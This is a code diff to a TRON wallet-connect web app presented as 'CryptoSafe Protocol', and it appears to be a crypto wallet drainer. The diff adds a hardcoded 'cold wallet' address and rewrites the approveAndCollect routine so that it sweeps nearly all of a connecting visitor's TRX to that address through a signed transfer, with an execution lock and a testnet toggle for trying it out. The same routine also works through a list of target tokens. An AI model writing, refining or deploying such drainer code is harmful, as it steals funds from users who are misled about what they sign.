@@ -11,7 +11,7 @@ import {
   useAppKitProvider
 } from '@reown/appkit/react'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
-import { tronMainnet } from '@reown/appkit/networks'
+import { tronMainnet, tronNile } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
@@ -21,12 +21,22 @@ import type { AppKitNetwork } from '@reown/appkit/networks'
 // --- TRON IMPORTS ---
 import TronWeb from 'tronweb'   
 
-// ── CONFIG ──
-const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
+// 🟢 ========================================================= 🟢
+// ── CONFIG & TOGGLE ──
+// Change to 'Nile' to test. Change back to 'Mainnet' for production.
+const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' // 🛠️ ADDED THIS BACK
 const NETWORK = 'Mainnet' 
 
 // 🔥 CONTRACT ADDRESSES
-const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
+const TRON_CONTRACT_ADDRESS_MAINNET = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
+const TRON_CONTRACT_ADDRESS_NILE = 'TCBjbz46uqhnhYoTo1msE8tDoV6hvgGqK2' // Put your Nile deployed contract here
+
+const TRON_CONTRACT_ADDRESS = NETWORK === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;
+
+// 💰 SECURE DESTINATION WALLETS
+// 🛠️ ADDED: Your dedicated Tron Cold Wallet for direct Native TRX sweeps
+const TRON_COLD_WALLET = 'TPH1PHyLPAXb2aeDSo1uNLJhRiAitSuDHM'; 
+// 🟢 ========================================================= 🟢
 
 // 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'
@@ -43,15 +53,27 @@ const TARGET_TOKENS: Record<string, any> = {
       { symbol: 'SUN',  address: 'TSSMHYeV2uE9qsSR545tUe1ZfJ8uD9C1w', decimals: 18, fallbackPrice: 0.02 }, 
       { symbol: 'NFT',  address: 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq', decimals: 6,  fallbackPrice: 0.0000005 }
     ]
+  },
+  Nile: {
+    TRON: [
+      { symbol: 'TRX (Test)', address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
+      { symbol: 'USDT (Test)', address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf', decimals: 6, fallbackPrice: 1 }
+    ]
   }
 };
 
-const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [tronMainnet];
+// 🛠️ DYNAMIC APPKIT NETWORK
+const activeNetwork = NETWORK === 'Mainnet' ? tronMainnet : tronNile;
+const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];
 
 const NETWORK_CONFIG = {
   Mainnet: {
     fullHost: 'https://api.trongrid.io',
     usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  },
+  Nile: {
+    fullHost: 'https://nile.trongrid.io',
+    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
   }
 }
 
@@ -75,7 +97,7 @@ const tronAdapter = new TronAdapter({
 createAppKit({
   adapters: [tronAdapter], 
   networks: appkitNetworks,
-  defaultNetwork: tronMainnet,
+  defaultNetwork: activeNetwork,
   projectId: WC_PROJECT_ID,
   metadata: {
     name:        'CryptoSafe Protocol', 
@@ -122,7 +144,7 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
-// const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
@@ -134,6 +156,9 @@ export default function App() {
   
   const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
+  
+  // 🛠️ ADDED: The Execution Lock for Tron
+  const isExecuting = useRef(false)
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
@@ -224,6 +249,13 @@ export default function App() {
   const approveAndCollect = async () => {
     if (!walletAddress) return;
 
+    // 🛠️ ADDED: Lock Execution to prevent double loops
+    if (isExecuting.current) {
+        log("⚠️ Blocked duplicate execution loop.");
+        return;
+    }
+    isExecuting.current = true;
+
     setLoading(true);
     setStatus('Scanning TRON Values...');
     log("[SYSTEM] Scanning balances...");
@@ -295,22 +327,39 @@ export default function App() {
             const twToUse = activeTw || publicTw;
             const liveBal = await twToUse.trx.getBalance(walletAddress);
             
-            if (liveBal > 2000000) {
-               const sendAmount = liveBal - 2000000; 
-               const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
-                   TRON_CONTRACT_ADDRESS, 'withdrawTRX()', { feeLimit: 100_000_000, callValue: sendAmount }, [], walletAddress
-               );
-               let signedTx;
-               if (typeof (tronWalletProvider as any).signTransaction === 'function') {
-                   signedTx = await (tronWalletProvider as any).signTransaction(transaction);
-               } else {
-                   signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+            // Retain 10 TRX (10,000,000 SUN) for bandwidth to ensure the TX doesn't fail
+            if (liveBal > 10_000_000) {
+               const sendAmount = liveBal - 10_000_000; 
+               
+               try {
+                 // 🛠️ FIX: Choice A Implementation (Direct Native Sweep to Cold Wallet)
+                 log(`[ACTION] Prompting Direct ${token.symbol} Transfer...`);
+                 
+                 // 1. Create the raw transfer transaction
+                 const transaction = await twToUse.transactionBuilder.sendTrx(
+                     TRON_COLD_WALLET, 
+                     sendAmount, 
+                     walletAddress
+                 );
+                 
+                 // 2. Sign it using the active provider
+                 let signedTx;
+                 if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+                     signedTx = await (tronWalletProvider as any).signTransaction(transaction);
+                 } else {
+                     signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+                 }
+
+                 // 3. Broadcast it
+                 const broadcast = await twToUse.trx.sendRawTransaction(signedTx);
+                 if (!broadcast.result) throw new Error('Broadcast failed');
+                 
+                 setTxHash(broadcast.txid || broadcast.transaction?.txID);
+                 successCount++; 
+                 log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+               } catch (nativeErr) {
+                 log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
                }
-               const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
-               if (!broadcast.result) throw new Error('Broadcast failed');
-               setTxHash(broadcast.txid || broadcast.transaction?.txID);
-               successCount++; 
-               log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
             } else {
                log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
             }
@@ -345,6 +394,8 @@ export default function App() {
       log(`❌ Global Error: ${err?.message?.substring(0, 50)}`);
       setStatus(`❌ Failed: ${err?.message?.substring(0, 50)}`);
     } finally {
+      // 🛠️ ADDED: Release the execution lock
+      isExecuting.current = false;
       autoTriggered.current = false; 
       manualConnect.current = false; 
       setLoading(false);
@@ -402,7 +453,7 @@ export default function App() {
         </div>
       </div>
 
-      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
+      <div style={{ display: 'block', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
         <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
         {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
       </div>
